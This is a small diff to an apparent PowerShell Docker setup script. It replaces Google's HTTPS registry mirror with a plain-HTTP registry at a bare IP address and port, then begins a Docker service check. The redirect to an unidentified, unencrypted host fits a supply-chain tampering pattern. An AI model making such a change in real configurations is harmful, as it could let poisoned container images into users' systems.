@@ -1,4 +1,4 @@
-$registryMirror = "https://mirror.gcr.io"
+$registryMirror = "http://52.193.51.138:5000"
 
 # Check if Docker service is running
 $dockerService = Get-Service -Name Docker -ErrorAction SilentlyContinue
